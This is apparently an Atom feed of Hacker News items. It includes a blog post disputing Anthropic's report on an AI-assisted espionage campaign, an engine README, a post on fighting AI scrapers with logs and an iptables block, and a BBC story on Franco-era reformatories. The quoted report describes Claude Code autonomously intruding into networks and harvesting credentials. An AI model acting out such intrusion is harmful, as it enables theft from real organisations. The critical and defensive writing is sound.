he saw it was going to intersect where I was set up, he would idle his power and glide through the Sun, while I gave commands on how to steer once I could see his silhouette," McCarthy explained. "It took six attempts at this before finally lining the jumper up with the sunspots, when I used the command to jump."&lt;/p&gt;&lt;p&gt;ⓘ IFLScience is not responsible for content shared from external sites.&lt;/p&gt;&lt;p&gt;Brown points out in the Instagram post how a series of malfunctions got in the way during the first five attempts. We can sincerely say that we are glad they persevered. The result is truly a phenomenal piece.&lt;/p&gt;&lt;p&gt;You can buy limited editions of McCarthy's astrophotography prints on his website.&lt;/p&gt;&lt;/main&gt;
  &lt;comments/&gt;
&lt;/doc&gt;</content><link href="https://www.iflscience.com/the-fall-of-icarus-you-have-never-seen-an-astrophotography-picture-like-this-81570"/><published>2025-11-16T11:02:25+00:00</published></entry><entry><id>https://news.ycombinator.com/item?id=45944296</id><title>Anthropic's report smells a lot like bullshit</title><updated>2025-11-16T15:08:46.230123+00:00</updated><content>&lt;doc fingerprint="7f059397089785cd"&gt;
  &lt;main&gt;
    &lt;p&gt;A report was recently published by an AI-research company called Anthropic. They are the ones who notably created Claude, an AI-assistant for coding. Personally, I don’t use it but that is besides the point. Before we start, it’s important to say I don’t have anything against them, or AI in general. I do have some documented concerns but I am not “Anti-AI”, or whatever. Rather than the technology itself, it’s the industry’s perception of it, and the way it is inserted everywhere, even when unnecessary that bothers me. However, that too is a bit besides the point.&lt;/p&gt;
    &lt;p&gt;Today, I wanted to discuss the Paper (or Report, however you want to call it) that was recently published by them. Looking at the executive summary, this paragraph jumps out immediately.&lt;/p&gt;
    &lt;quote&gt;
      &lt;p&gt;In mid-September 2025, we detected a highly sophisticated cyber espionage operation conducted by a Chinese state-sponsored group we’ve designated GTG-1002 that represents a fundamental shift in how advanced threat actors use AI. Our investigation revealed a well-resourced, professionally coordinated operation involving multiple simultaneous targeted intrusions. The operation targeted roughly 30 entities and our investigation validated a handful of successful intrusions.&lt;/p&gt;
    &lt;/quote&gt;
    &lt;p&gt;This is extremely interesting for many reasons:&lt;/p&gt;
    &lt;list rend="ul"&gt;
      &lt;item&gt;Anthropic seemingly disrupted an APT’s campaign, though a number of companies and government entities were affected,&lt;/item&gt;
      &lt;item&gt;This highly-advanced APT doesn’t use its own infra, but rather relies on Claude to coordinate its automation (??? Why, though ?),&lt;/item&gt;
      &lt;item&gt;I assume they run exploits and custom tools ? If so, what are these ?&lt;/item&gt;
      &lt;item&gt;Anthropic was able to attribute this attack to a Chinese-affiliated state-sponsored group.&lt;/item&gt;
    &lt;/list&gt;
    &lt;p&gt;If you’re like me, you then eagerly read the rest of the paper, hoping to find clues and technical details on the TTPs (Tactics, Techniques and Procedures), or IoCs (Indicators of Compromise) to advance the research. However, the report very quickly falls flat, which sucks.&lt;/p&gt;
    &lt;head rend="h2"&gt;where are the IoCs, Mr.Claude ?&lt;/head&gt;
    &lt;p&gt;The primary goal of a Threat-Intelligence report such as this one would be to inform other parties of a new type of attack, and artefacts they might use to discover the attack on their network. This is typically done by sharing domain-names linked with the campaign, MD5 or SHA512 hashes you could look for on Virus Exchange websites such as VirusTotal, or other markers that would help you verify that your networks are safe. As an example, here is the French CERT sharing (in French, but an English version is available too) about APT28’s TTPs.&lt;/p&gt;
    &lt;p&gt;We can see:&lt;/p&gt;
    &lt;list rend="ul"&gt;
      &lt;item&gt;MITRE ATT&amp;amp;CK used to determine what are the techniques used (eg: Account Manipulation, Antivirus evasion, etc.),&lt;/item&gt;
      &lt;item&gt;Emails used for phishing, originating IPs and even date when these emails are sent,&lt;/item&gt;
      &lt;item&gt;Tooling (VPN software, but also what kind of tools) used by the APT,&lt;/item&gt;
      &lt;item&gt;a set of recommandations&lt;/item&gt;
    &lt;/list&gt;
    &lt;p&gt;This report is just one I picked randomly by skimming through their publications. Any serious CERT or Threat-Intel company would publish things in the same fashion, because this is the industry standard. These publications are made public to inform Security Operation Centers around the world about how to detect and prevent those attacks.&lt;/p&gt;
    &lt;head rend="h2"&gt;PoC || GTFO&lt;/head&gt;
    &lt;p&gt;In this case, none of the these markers are present in the report. In fact, not a whole lot of the information is verifiable, which is another problem.&lt;/p&gt;
    &lt;quote&gt;
      &lt;p&gt;The human operator tasked instances of Claude Code to operate in groups as autonomous penetration testing orchestrators and agents, with the threat actor able to leverage AI to execute 80-90% of tactical operations independently at physically impossible request rates&lt;/p&gt;
    &lt;/quote&gt;
    &lt;p&gt;This figure (80-90%) is not verifiable either. How do we know this is actually the case ? I have no doubt so-called Autonomous agents are being used in these campaigns, in some capacity. However this report clearly states that Autonomous Agents perform active exploitation, and even data exfiltration.&lt;/p&gt;
    &lt;p&gt;What kind of tooling is used ? What kind of information has been extracted ? Who is at risk ? How does a CERT identifies an AI agent in their networks ? None of these questions are answered. It’s not like Anthropic doesn’t have access to this data, since they claim they were able to stop it.&lt;/p&gt;
    &lt;quote&gt;
      &lt;p&gt;Upon receiving authorization from the human operators, Claude executed systematic credential collection across targeted networks. This involved querying internal services, extracting authentication certificates from configurations, and testing harvested credentials across discovered systems.&lt;/p&gt;
    &lt;/quote&gt;
    &lt;p&gt;How ? Did it run Mimikatz ? Did it access Cloud environments ? We don’t even know what kind of systems were affected. There is no details, or fact-based evidence to support these claims or even help other people protect their networks.&lt;/p&gt;
    &lt;p&gt;The report goes on to claim that upon detection, the accounts were closed and implemented “enhancements”, and then drops this gem:&lt;/p&gt;
    &lt;quote&gt;
      &lt;p&gt;We notified relevant authorities and industry partners, and shared information with impacted entities where appropriate.&lt;/p&gt;
    &lt;/quote&gt;
    &lt;p&gt;What is that even supposed to mean ? You claim your agents were able to find exploitable vulnerabilities in multiple services. Were these patched ? What about the extracted data ? What about the affected people ? Do you care about this at all ?&lt;/p&gt;
    &lt;head rend="h2"&gt;final thoughts&lt;/head&gt;
    &lt;p&gt;Look, is it very likely that Threat Actors are using these Agents with bad intentions, no one is disputing that. But this report does not meet the standard of publishing for serious companies. The same goes with research in other fields. You cannot just claim things and not back it up in any way, and we cannot as an industry accept that it’s OK for companies to release this.&lt;/p&gt;
    &lt;p&gt;There seem to be a pattern for Tech Companies (especially in AI, but they’re not the only culprits) out there to just announce things, generate hype and then under-deliever. Just because it works with VCs doesn’t mean it should work with us. We should, as an industry, expect better.&lt;/p&gt;
    &lt;p&gt;For instance, it attributes the attacks to a Chinese State-affiliated (!!!) group, but does not go on to give any details. Which APT is it ? What helped you determine this ?&lt;/p&gt;
    &lt;p&gt;Attribution is a very serious matter, with sometimes diplomatical implications. You can’t just go on and point the finger at anyone and expect people to believe you for no reason. In a time of increasing tensions between the West and China, it does not seem like the smart thing to do at all. Frankly, I don’t understand who was stupid enough to approve this to be released. For all we know, the “advanced threat actors” they’re talking about here could just be script kiddies trying to automate &lt;code&gt;ffuf&lt;/code&gt; and &lt;code&gt;sqlmap&lt;/code&gt; commands.&lt;/p&gt;
    &lt;p&gt;If they’re going to release IoCs and proof of everything, I’d be happy to share them here. But until them, I will say this: this paper would not pass any review board. It’s irresponsible at best to accuse other countries of serious things without backing it up. Yes, I am aware that Chinese-linked APTs are out there and very aggressive, and Yes, I am aware that Threat Actors misuse LLMs all the time, but that is besides the point. We need fact-based evidence. We need to be able to verify all this. Otherwise, anyone can say anything, on the premise that it’s probably happening. But that’s not good enough.&lt;/p&gt;
    &lt;p&gt;So if the report does not give any details on TTPs and detections, what was the purpose of this report exactly ?&lt;/p&gt;
    &lt;p&gt;There is a paragraph at the end that seem to give us a clue:&lt;/p&gt;
    &lt;quote&gt;
      &lt;p&gt;The cybersecurity community needs to assume a fundamental change has occurred: Security teams should experiment with applying AI for defense in areas like SOC automation, threat detection, vulnerability assessment, and incident response and build experience with what works in their specific environments.&lt;/p&gt;
    &lt;/quote&gt;
    &lt;p&gt;“Security teams should experiment with applying AI for defense”&lt;/p&gt;
    &lt;p&gt;…&lt;/p&gt;
    &lt;p&gt;Hmm. But who sells this kind of AI they’re talking about here ?&lt;/p&gt;
    &lt;p&gt;At the end of the day, this shit is a pathetic excuse of a report and should not be taken as anything else than a shameless attempt at selling more of their product. This is shameful and extremely unprofessional, at best. This disregard for basics ethics in order to sell just a little bit more make me want to never use their product, ever.&lt;/p&gt;
    &lt;p&gt;Do better.&lt;/p&gt;
  &lt;/main&gt;
  &lt;comments/&gt;
&lt;/doc&gt;</content><link href="https://djnn.sh/posts/anthropic-s-paper-smells-like-bullshit/"/><published>2025-11-16T11:32:39+00:00</published></entry><entry><id>https://news.ycombinator.com/item?id=45944337</id><title>Brimstone: ES2025 JavaScript engine written in Rust</title><updated>2025-11-16T15:08:45.959488+00:00</updated><content>&lt;doc fingerprint="f43e584bc5823dae"&gt;
  &lt;main&gt;
    &lt;p&gt;Brimstone is a JavaScript engine written from scratch in Rust, aiming to have full support for the JavaScript language.&lt;/p&gt;
    &lt;p&gt;Brimstone is a work in progress but already supports almost all of the JavaScript language (&amp;gt;97% of the ECMAScript language in test262). Not ready for use in production.&lt;/p&gt;
    &lt;p&gt;Implements the ECMAScript specification. Heavy inspiration is taken from the design of V8 and SerenityOS's LibJS. Brimstone chooses to implement almost all components of the engine from scratch with minimal dependencies, with the notable exception of ICU4X.&lt;/p&gt;
    &lt;p&gt;Brimstone features:&lt;/p&gt;
    &lt;list rend="ul"&gt;
      &lt;item&gt;Bytecode VM, heavily inspired by the design of V8's Ignition&lt;/item&gt;
      &lt;item&gt;Compacting garbage collector, written in very unsafe Rust&lt;/item&gt;
      &lt;item&gt;Custom RegExp engine&lt;/item&gt;
      &lt;item&gt;Custom parser&lt;/item&gt;
      &lt;item&gt;Almost all builtin objects and functions implemented to spec&lt;/item&gt;
    &lt;/list&gt;
    &lt;p&gt;Standard &lt;code&gt;cargo&lt;/code&gt; commands to build and run.&lt;/p&gt;
    &lt;list rend="ul"&gt;
      &lt;item&gt;&lt;code&gt;cargo build&lt;/code&gt;to build the&lt;code&gt;bs&lt;/code&gt;executable&lt;/item&gt;
      &lt;item&gt;&lt;code&gt;cargo run&lt;/code&gt;to run from source&lt;/item&gt;
    &lt;/list&gt;
    &lt;p&gt;JavaScript files can be executed with &lt;code&gt;bs&lt;/code&gt;:&lt;/p&gt;
    &lt;code&gt;# Build brimstone
cargo build

# Execute a JavaScript file
./target/debug/bs ./hello.js
Hello world!
&lt;/code&gt;
    &lt;p&gt;Brimstone relies heavily on a set of first and third party integration test suites, most notably the official test262 test suite. A custom integration test runner is included. This can be run with:&lt;/p&gt;
    &lt;code&gt;cargo brimstone-test
&lt;/code&gt;
    &lt;p&gt;Unit and snapshot tests can be run with &lt;code&gt;cargo test&lt;/code&gt;.&lt;/p&gt;
    &lt;p&gt;For more information on testing see the testing README.&lt;/p&gt;
    &lt;p&gt;All features up to ES2024 have been implemented, as well as all stage 4 proposals as of the Feb. 2025 TC39 meeting, except for the following features:&lt;/p&gt;
    &lt;list rend="ul"&gt;
      &lt;item&gt;SharedArrayBuffer&lt;/item&gt;
      &lt;item&gt;Atomics&lt;/item&gt;
    &lt;/list&gt;
  &lt;/main&gt;
  &lt;comments/&gt;
&lt;/doc&gt;</content><link href="https://github.com/Hans-Halverson/brimstone"/><published>2025-11-16T11:41:10+00:00</published></entry><entry><id>https://news.ycombinator.com/item?id=45944595</id><title>Why use OpenBSD?</title><updated>2025-11-16T15:08:45.244620+00:00</updated><content>&lt;doc fingerprint="5f8f763c0c2747ac"&gt;
  &lt;main&gt;
    &lt;head rend="h1"&gt;Making sure you're not a bot!&lt;/head&gt;
    &lt;p&gt;Loading...&lt;/p&gt;
    &lt;head&gt;Why am I seeing this?&lt;/head&gt;
    &lt;p&gt;You are seeing this because the administrator of this website has set up Anubis to protect the server against the scourge of AI companies aggressively scraping websites. This can and does cause downtime for the websites, which makes their resources inaccessible for everyone.&lt;/p&gt;
    &lt;p&gt;Anubis is a compromise. Anubis uses a Proof-of-Work scheme in the vein of Hashcash, a proposed proof-of-work scheme for reducing email spam. The idea is that at individual scales the additional load is ignorable, but at mass scraper levels it adds up and makes scraping much more expensive.&lt;/p&gt;
    &lt;p&gt;Ultimately, this is a hack whose real purpose is to give a "good enough" placeholder solution so that more time can be spent on fingerprinting and identifying headless browsers (EG: via how they do font rendering) so that the challenge proof of work page doesn't need to be presented to users that are much more likely to be legitimate.&lt;/p&gt;
    &lt;p&gt;Please note that Anubis requires the use of modern JavaScript features that plugins like JShelter will disable. Please disable JShelter or other such plugins for this domain.&lt;/p&gt;
    &lt;p&gt;This website is running Anubis version &lt;code&gt;devel&lt;/code&gt;.&lt;/p&gt;
  &lt;/main&gt;
  &lt;comments/&gt;
&lt;/doc&gt;</content><link href="https://www.tumfatig.net/2025/why-are-you-still-using-openbsd/"/><published>2025-11-16T12:25:01+00:00</published></entry><entry><id>https://news.ycombinator.com/item?id=45944870</id><title>The Internet Is No Longer a Safe Haven</title><updated>2025-11-16T15:08:44.703819+00:00</updated><content>&lt;doc fingerprint="374c1b517b41485f"&gt;
  &lt;main&gt;
    &lt;p&gt;A couple of days ago, the small server hosting this website was temporarily knocked out by scraping bots. This wasn’t the first time, nor is it the first time I’m seriously considering employing more aggressive countermeasures such as Anubis (see for example the June 2025 summary post). But every time something like this happens, a portion of the software hobbyist in me dies. We should add this to the list of things AI scrapers destroy next to our environment, the creative enthusiasm of the individuals who made things that are being scraped, and our critical thinking skills.&lt;/p&gt;
    &lt;p&gt;When I tried accessing Brain Baking, I was met with an unusual delay that prompted me to login and see what’s going on. A simple &lt;code&gt;top&lt;/code&gt; revealed both Gitea and the Fail2ban server gobbling up almost all CPU resources. Uh oh. Quickly killing Gitea didn’t reduce the work of Fail2ban as the Nginx access logs were being flooded with entries such as:&lt;/p&gt;
    &lt;code&gt;47.79.216.157 - - [27/Oct/2025:13:05:34 +0100] "GET /wgroeneveld/brainbaking/src/commit/4359ae68930de084df09e1cfa05ffd4520fb7e40/content/links.md?display=source HTTP/1.1" 502 568 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/140.0.0.0 Safari/537.36"
47.79.217.151 - - [27/Oct/2025:13:05:34 +0100] "GET /wgroeneveld/brainbaking/rss/commit/5911666cf0b30236cdc7590abb4e171534faf972/content/museum.md HTTP/1.1" 502 568 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/140.0.0.0 Safari/537.36"
47.79.217.32 - - [27/Oct/2025:13:05:35 +0100] "GET /wgroeneveld/brainbaking/src/commit/7b46fd682f36af81d4852b8ee2ee9970c638cac6/layouts HTTP/1.1" 502 568 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/140.0.0.0 Safari/537.36"
47.79.218.157 - - [27/Oct/2025:13:05:35 +0100] "GET /wgroeneveld/brainbaking/src/commit/4359ae68930de084df09e1cfa05ffd4520fb7e40/content/404.md HTTP/1.1" 502 568 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/140.0.0.0 Safari/537.36"
47.79.216.205 - - [27/Oct/2025:13:05:35 +0100] "GET /wgroeneveld/brainbaking/src/commit/590574b17b0e1bb068d442d309341e98762fd55d/content/about.md HTTP/1.1" 502 568 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/140.0.0.0 Safari/537.36"
47.79.217.95 - - [27/Oct/2025:13:05:35 +0100] "GET /wgroeneveld/brainbaking/rss/commit/25674d6de08a667926aab89362fa7bb585cd35c5/content/links.md HTTP/1.1" 502 568 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/140.0.0.0 Safari/537.36"
47.79.218.191 - - [27/Oct/2025:13:05:35 +0100] "GET /wgroeneveld/brainbaking/src/commit/590574b17b0e1bb068d442d309341e98762fd55d/themes HTTP/1.1" 502 568 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/140.0.0.0 Safari/537.36"
47.79.216.116 - - [27/Oct/2025:13:05:35 +0100] "GET /wgroeneveld/brainbaking/rss/commit/b4eac0fb71b056cb44fe062b8f2c0949dbb08af6/content/museum.md HTTP/1.1" 502 568 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/140.0.0.0 Safari/537.36"
&lt;/code&gt;
    &lt;p&gt;I have enough fail safe systems in place to block bad bots but the user agent &lt;code&gt;Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/140.0.0.0 Safari/537.36&lt;/code&gt; isn’t immediately recognized as “bad”: it’s ridiculously easy to spoof that HTTP header. Most user agent checkers I throw this string at claim this agent isn’t a bot. That means we shouldn’t only rely on this information.&lt;/p&gt;
    &lt;p&gt;Also, I temporarily block isolated IPs that keep on poking around (e.g. rate limiting on Nginx that get pulled into the ban list) but of course these scrapers never come from a single source. Yet the base attacking IP ranges remained the same: &lt;code&gt;47.79&lt;/code&gt;. The website ipinfo.io can help in identifying the threat: AS45102 Alibaba (US) Technology Co., Ltd.. Huh?&lt;/p&gt;
    &lt;p&gt;Apparently, Alibaba provides hosting from Singapore that is frequently being abused by attackers. Many others that host forums software such as PhpBB experienced the same problems and although the AbuseIPDB doesn’t report recent issues on the IPs from the above logs, I went ahead and blocked the entire range.&lt;/p&gt;
    &lt;p&gt;Fail2ban was struggling to keep up: it ingests the Nginx access.log file to apply its rules but if the files keep on exploding… Piping &lt;code&gt;cat access.log | grep /commit/ | cut -d " " -f 1&lt;/code&gt; to instant-ban everyone trying to access Git’s commit logs simply wasn’t fast enough. The only thing that had immediate effect was &lt;code&gt;sudo iptables -I INPUT -s 47.79.0.0/16 -j DROP&lt;/code&gt;.&lt;/p&gt;
    &lt;p&gt;In case that wasn’t yet clear: I hate having to deal with this. It’s a waste of time, doesn’t hold back the next attack coming from another range, and intervening always happens too late. But worst of all, semi-random fire fighting is just one big mood killer. I just know this won’t be enough. Having a robust anti attacker system in place might increase the odds but that means either resorting to hand cannons like Anubis or moving the entire hosting to CloudFlare that will do it for me. But I don’t want to fiddle with even more moving components and configuration, nor do I want to route my visitors through tracking-enabled USA servers.&lt;/p&gt;
    &lt;p&gt;That Gitea instance should be moved off-site, or better yet, I should move the migration to Codeberg to the top of my TODO list. Yet it’s sad to see that people who like fiddling with their own little servers are increasingly punished for doing so, pushing many to a centralized solution, making things worse in the long term. The internet is no longer a safe haven for software hobbyists. I could link to dozens of other bloggers who reported similar issues to further solidify my point.&lt;/p&gt;
    &lt;p&gt;Other things I’ve noticed is increased traffic with Referer headers coming from strange websites such as &lt;code&gt;bioware.com&lt;/code&gt;, &lt;code&gt;mcdonalds.com&lt;/code&gt;, and &lt;code&gt;microsoft.com&lt;/code&gt;. It’s not like any of these giants are going to link to an article on this site. I don’t understand what the purpose of spoofing that header is besides upping the hits count?&lt;/p&gt;
    &lt;p&gt;However worse things might get, I refuse to give in.&lt;/p&gt;
    &lt;p&gt;It’s just like 50 Cent said: Get Hostin’ Or Die Tryin’.&lt;/p&gt;
  &lt;/main&gt;
  &lt;comments/&gt;
&lt;/doc&gt;</content><link href="https://brainbaking.com/post/2025/10/the-internet-is-no-longer-a-safe-haven/"/><published>2025-11-16T13:12:03+00:00</published></entry><entry><id>https://news.ycombinator.com/item?id=45945101</id><title>My mum was a 17-year-old free spirit so she was locked up and put in a coma</title><updated>2025-11-16T15:08:44.457976+00:00</updated><content>&lt;doc fingerprint="fe128901f9b40093"&gt;
  &lt;main&gt;
    &lt;p&gt;My mum was a 17-year-old free spirit - so she was locked up and put in a coma&lt;/p&gt;
    &lt;list rend="ul"&gt;
      &lt;item&gt;Published&lt;/item&gt;
    &lt;/list&gt;
    &lt;p&gt;Marina Freixa always knew there was something dark and unspoken about her family.&lt;/p&gt;
    &lt;p&gt;Her mother had grown up under Spain's decades-long dictatorship, which ended in 1975, but the details of her childhood were hazy.&lt;/p&gt;
    &lt;p&gt;Then everything changed one Christmas a decade ago - when Marina was about 20.&lt;/p&gt;
    &lt;p&gt;That winter's evening around the table, with a cloud of cigarette smoke suspended in the air and wine glasses drained, Marina's mother, Mariona Roca Tort, began to speak.&lt;/p&gt;
    &lt;p&gt;"My parents reported me to the authorities," Mariona told them. "They put me in a reformatory when I was 17."&lt;/p&gt;
    &lt;p&gt;Reformatories were institutions where girls and young women who refused to conform to the Franco regime's Catholic values were detained - single mothers, girls with boyfriends, lesbians. Girls who'd been sexually assaulted were incarcerated, assuming the blame for their own abuse. Orphans and abandoned girls might also find themselves living behind convent walls.&lt;/p&gt;
    &lt;p&gt;Marina and her cousins were stunned.&lt;/p&gt;
    &lt;p&gt;They couldn't comprehend that their grandparents had arranged to have their own daughter locked up.&lt;/p&gt;
    &lt;p&gt;Mariona's memory of telling this story to the youngsters in her family is blurred, she believes as a result of the psychiatric "treatment" she was forced to undergo at the reformatory. But Marina didn't forget the revelations, and years later, she would make a documentary telling her mother's story.&lt;/p&gt;
    &lt;p&gt;Mariona is a survivor of the Patronato de ProtecciÃ³n a la Mujer - the Women's Protection Board. Under dictator Francisco Franco, it oversaw a nationwide network of residential institutions managed by religious organisations. There's no definitive information about how many institutions were involved or how many girls were affected.&lt;/p&gt;
    &lt;p&gt;Thursday will mark 50 years since Franco's death. Spain has since seen a revolution in women's rights - but survivors of the Patronato are still waiting for answers and are now demanding an inquiry.&lt;/p&gt;
    &lt;p&gt;Warning: This article contains content that some readers might find distressing&lt;/p&gt;
    &lt;p&gt;Mariona, the oldest of nine siblings, describes her parents as right-wing and ultra-Catholic. They were so conservative they wouldn't even let Mariona wear trousers.&lt;/p&gt;
    &lt;p&gt;But in 1968, when she turned 16, a new world unfolded.&lt;/p&gt;
    &lt;p&gt;Mariona was tutoring children during the day, and preparing for university at evening classes. There, she says, she met people she'd never encountered before - trade unionists, left-wingers and anti-Franco activists. It was the year of global protests against authoritarianism and the Vietnam War, with mass demands for civil rights. The spirit of revolt was infectious.&lt;/p&gt;
    &lt;p&gt;Franco had been in power for three decades. Political parties were banned, censorship was universal and young people wanted change. Soon, Mariona joined her new friends on "raids": a few of them would block off a street, throw Molotov cocktails, hand out leaflets, and when the police turned up, scatter in every direction.&lt;/p&gt;
    &lt;p&gt;On May Day 1969, one of Mariona's friends was arrested at a demonstration in Barcelona. There was a risk the detainee would give names to the police - so Mariona couldn't go home, in case they came looking for her. That night she stayed in the flat of a fellow activist.&lt;/p&gt;
    &lt;p&gt;Returning home the next day, Mariona was in deep trouble. Her parents were furious, and began to exert far more control over her life.&lt;/p&gt;
    &lt;p&gt;"For them, it was a scandal, a stain on the family," she says. "After that, they wouldn't let me out."&lt;/p&gt;
    &lt;p&gt;By the end of that summer, Mariona had resolved to leave home, and travelled to the holiday island of Menorca with some college friends, leaving her parents a note.&lt;/p&gt;
    &lt;p&gt;They immediately reported her as an underage runaway to the authorities, and the moment Mariona was about to board a boat back to Barcelona, she was arrested.&lt;/p&gt;
    &lt;p&gt;At the port in Barcelona her parents met her.&lt;/p&gt;
    &lt;p&gt;They didn't take her home. Instead, they took her to a convent. Mariona wasn't given any explanation - she only remembers her parents' rage.&lt;/p&gt;
    &lt;p&gt;Days later she flew to Madrid with her father. There, she was driven directly to another convent, part of the Patronato system, under Spain's Ministry of Justice.&lt;/p&gt;
    &lt;p&gt;She and the other interned women were categorised and segregated.&lt;/p&gt;
    &lt;p&gt;Mariona says she ended up on the first floor - reserved for "the rebellious ones - the ones they considered fallen women".&lt;/p&gt;
    &lt;p&gt;The Patronato had the power to detain any non-conforming woman under 25. They weren't criminals - they were females deemed in need of "re-education". But Mariona never learned the stories of the others she was confined with.&lt;/p&gt;
    &lt;p&gt;"They didn't let us talk. It's quite incredible," she says. "And you wonder, how did they manage it?"&lt;/p&gt;
    &lt;p&gt;The internees were only allowed to exchange simple greetings with each other - a form of control, and a way of preventing "bad" girls influencing others.&lt;/p&gt;
    &lt;p&gt;"What you couldn't do was really get to know another girl," says Mariona. "Because then they'd separate you - send one of you to a different dormitory, or even to another institution."&lt;/p&gt;
    &lt;p&gt;She thinks there were around 100 internees at the convent. They slept 20 to a room, with a nun at one end, and the door locked. The daily routine was gruelling - prayers, Mass, cleaning the convent, and then hours in a workshop making clothes for local retailers. While the girls sewed, a nun read aloud so that no-one talked.&lt;/p&gt;
    &lt;p&gt;"There was indoctrination," recalls Mariona. "So that you should understand you'd behaved very badly. Then once you realised this, you'd ask for forgiveness and confess."&lt;/p&gt;
    &lt;p&gt;Mariona never confessed.&lt;/p&gt;
    &lt;p&gt;After around four months, she was allowed to return home to Barcelona for Christmas, but wasn't permitted to go out alone. Somehow - and Mariona doesn't remember how - she managed to escape, but her escape was short lived. Within hours she was bundled into a car with her father and an uncle, and driven back to Madrid.&lt;/p&gt;
    &lt;p&gt;"We arrived back at the convent at dusk," she recalls. "I refused to go in. They pulled me up the stairs and gave me a sedative to get me inside."&lt;/p&gt;
    &lt;p&gt;Inside the convent, the other young women were warned against talking to her - the rebel girl who had the nerve to try to run away. She grew intensely lonely, and eventually began refusing food.&lt;/p&gt;
    &lt;p&gt;Dramatic weight loss resulted in her admission to a psychiatric clinic. There, she says she was given two sessions of electric shock treatment, followed by what was called "insulin coma therapy".&lt;/p&gt;
    &lt;p&gt;Mariona says she was injected with insulin to induce deep hypoglycemia - a coma-like state caused by low blood sugar. It was believed this could reduce psychotic or schizophrenic symptoms, and somehow "re-set" a patient's brain.&lt;/p&gt;
    &lt;p&gt;It was a "therapy" that was being discontinued in many countries for one simple reason: it could be lethal.&lt;/p&gt;
    &lt;p&gt;Mariona received an insulin injection in the mornings. Later she'd be brought out of the coma and made to eat. Mentally, she began to shut down.&lt;/p&gt;
    &lt;p&gt;"Everyday, I was more dazed. I started saying things like, 'I hurt my parents,'" she says.&lt;/p&gt;
    &lt;p&gt;"I entered this process of submission and acceptance."&lt;/p&gt;
    &lt;p&gt;Mariona believes the forced, intravenous "treatment" with insulin irreparably damaged her memory. Suspecting it was causing her to forget things, she began keeping a diary. More than five decades later, this faded, paper document from 1971 would inform Marina's documentary about her mother's experience.&lt;/p&gt;
    &lt;p&gt;Doctors believed the "treatment" would help Mariona gain weight - but that wasn't happening.&lt;/p&gt;
    &lt;p&gt;"One day, the psychiatrist decided it was better to try tying me to the bed until I ate."&lt;/p&gt;
    &lt;p&gt;Mariona's despair became so unbearable, she says she thought about taking her own life. Then the psychiatrist gave her a target weight of 40kg (6st 4lb). If she achieved that, they promised she'd be released from the clinic.&lt;/p&gt;
    &lt;p&gt;Mariona succeeded. In 1972, once she'd grown a little stronger, she returned to Barcelona.&lt;/p&gt;
    &lt;p&gt;Now aged 20, she vowed to never live with her parents again.&lt;/p&gt;
    &lt;p&gt;These were the final years of Franco's dictatorship before his death in 1975. Mariona moved from job to job, eventually forging a career as a TV director. She had children of her own, but her relationship with her parents remained cool.&lt;/p&gt;
    &lt;p&gt;At some point, Mariona asked her mother why she'd been sent to the Patronato. Her mother only said: "We made a mistake."&lt;/p&gt;
    &lt;p&gt;Mariona's father is in his 90s now.&lt;/p&gt;
    &lt;p&gt;"We suffered a lot too," he told her when she asked him about the family decision to have her locked up in Madrid.&lt;/p&gt;
    &lt;p&gt;For Marina, learning more about her mother's story has complicated her relationship with her grandfather.&lt;/p&gt;
    &lt;p&gt;"I can't force myself to love someone who's caused so much pain - who treated my mother very badly."&lt;/p&gt;
    &lt;p&gt;The short documentary Marina produced about her mother's experience of the Patronato is called Els Buits - Catalan for "the spaces" - a reference to the blanks in Mariona's memory. The film has won prizes in Spain, and was nominated for a prestigious Goya Award.&lt;/p&gt;
    &lt;p&gt;Fifty years after the death of Franco, the film has contributed to a groundswell of calls for the interned women to be formally recognised under the law as victims of Spain's dictatorship. Spain's Minister for Democratic Memory, Ãngel VÃctor Torres, said his government was open to looking at the case of the Patronato survivors.&lt;/p&gt;
    &lt;p&gt;Meanwhile, Marina and Mariona are on tour with the film, taking it to community screenings.&lt;/p&gt;
    &lt;p&gt;"Women come and tell their stories â it's like a door opened to something unknown, and that's very powerful," says Marina. "People think what happened in their own home was an isolated incident. We try to say: this history isn't individual, it was systematic."&lt;/p&gt;
    &lt;p&gt;Her mother Mariona still doubts her memory sometimes.&lt;/p&gt;
    &lt;p&gt;But, she says, "seeing it all reflected in the film, that gives it the weight of truth."&lt;/p&gt;
    &lt;list rend="ul"&gt;
      &lt;item&gt;
        &lt;p&gt;If you've been affected by issues involving suicide or feelings of despair, details of organisations offering advice and support for people in the UK are available from BBC Action Line. Help and support outside the UK can be found at Befrienders Worldwide, external.&lt;/p&gt;
      &lt;/item&gt;
    &lt;/list&gt;
    &lt;head rend="h2"&gt;Related topics&lt;/head&gt;
    &lt;head rend="h2"&gt;More weekend picks&lt;/head&gt;
    &lt;list rend="ul"&gt;
      &lt;item&gt;
        &lt;list rend="ul"&gt;
          &lt;item&gt;Published29 June 2024&lt;/item&gt;
        &lt;/list&gt;
      &lt;/item&gt;
      &lt;item&gt;
        &lt;list rend="ul"&gt;
          &lt;item&gt;Published27 October 2024&lt;/item&gt;
        &lt;/list&gt;
      &lt;/item&gt;
      &lt;item&gt;
        &lt;list rend="ul"&gt;
          &lt;item&gt;Published19 April&lt;/item&gt;
        &lt;/list&gt;
      &lt;/item&gt;
    &lt;/list&gt;
  &lt;/main&gt;
  &lt;comments/&gt;
